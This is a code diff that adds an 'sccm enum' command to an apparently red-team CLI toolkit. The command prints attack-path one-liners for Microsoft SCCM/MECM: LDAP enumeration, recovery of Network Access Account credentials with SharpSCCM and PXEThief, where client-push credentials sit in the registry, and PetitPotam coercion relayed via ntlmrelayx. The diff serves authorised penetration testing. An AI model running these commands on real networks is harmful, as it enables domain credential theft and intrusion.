@@ -2639,6 +2639,54 @@ def cmd_retest(args, store):
 
 
 @needs_engagement
+def cmd_sccm_enum(args, store):
+    """SCCM/MECM enum — surface the attack surface of a Microsoft
+    Endpoint Configuration Manager install: management points,
+    distribution points, site codes, client-push accounts (CPA),
+    Network Access Account (NAA) recovery paths.
+
+    Print-only in this cut — the real enum wants SharpSCCM /
+    PXEThief; this surface documents the reachable enum path
+    from an SMB-reachable SCCM host + a low-priv domain account.
+    """
+    from . import config as config_mod
+    cfg = config_mod.load(store)
+    domain = cfg.get("domain") or "<domain>"
+    _ = args, store
+    print("SCCM/MECM enum + attack paths:\n")
+    print("=== Enum management points (MPs) + distribution points (DPs) ===")
+    print(f"  # LDAP query for SystemManagement container:")
+    print(f"  ldapsearch -H ldap://<dc> -b 'CN=System Management,"
+          f"CN=System,DC={domain.replace('.', ',DC=')}' -s sub")
+    print(f"  # Or via SharpSCCM (needs a domain cred):")
+    print(f"  SharpSCCM.exe get site-info -sms <MP-hostname>")
+    print()
+    print("=== Client push accounts (CPA) — often broad local admin ===")
+    print("  # If the SCCM server was owned, dump the CPA creds from:")
+    print("  # HKLM\\SOFTWARE\\Microsoft\\SMS\\Components\\SMS_CLIENT_CONFIG_MANAGER\\")
+    print("  # (protected by DPAPI; the SCCM service account can unlock)")
+    print()
+    print("=== Network Access Account (NAA) recovery ===")
+    print("  # NAA creds are pushed to every SCCM-enrolled client in the")
+    print("  # DataTransferService policy; recover via SharpSCCM:")
+    print("  SharpSCCM.exe local secrets  # runs on any SCCM client, prints NAA")
+    print("  # Or via PXEThief (attacks the PXE boot flow, no client needed):")
+    print("  PXEThief.py -i <SCCM-MP-ip>")
+    print()
+    print("=== Coerce SCCM site server to auth ===")
+    print("  # SCCM's SMB Provider service runs as SYSTEM — coerce with")
+    print("  # PetitPotam pointing at your ntlmrelayx → relay to LDAP or")
+    print("  # ADCS. See the esc8 chain profile shape.")
+    print()
+    print("=== Site database (SQL Server) ===")
+    print("  # The site DB contains every managed client's certs,")
+    print("  # policy assignments, and (unencrypted) NAA creds in older")
+    print("  # deployments. Reachable at CM_XXX on port 1433 —")
+    print("  # fieldkit mssql escalate <sql-host> maps here.")
+    return 0
+
+
+@needs_engagement
 def cmd_persist(args, store):
     """Print persistence one-liners per platform + technique.
     Same rationale as `pivot` — every persistence primitive
@@ -5097,6 +5145,22 @@ the spec is missing that field. `--from-file` reads one credential per line.
                             help="which platform's techniques to render "
                                  "(default: both)")
     p_persist.set_defaults(func=cmd_persist)
+
+    p_sccm = sub.add_parser(
+        "sccm",
+        help="SCCM/MECM enum + attack path documentation",
+        description="Modern AD environments deploy SCCM/MECM. This "
+                    "surface documents the reachable attack paths: "
+                    "MP/DP enum, client push accounts, Network Access "
+                    "Account recovery via SharpSCCM/PXEThief, coerce "
+                    "→ relay from SCCM site server, site DB via "
+                    "fieldkit mssql escalate.")
+    sccm_sub = p_sccm.add_subparsers(dest="sccm_command",
+                                         metavar="<action>")
+    sc_enum = sccm_sub.add_parser(
+        "enum", help="print SCCM enum + attack-path one-liners")
+    sc_enum.set_defaults(func=cmd_sccm_enum)
+    p_sccm.set_defaults(func=lambda a: _missing(p_sccm))
 
     p_refresh = sub.add_parser(
         "refresh",
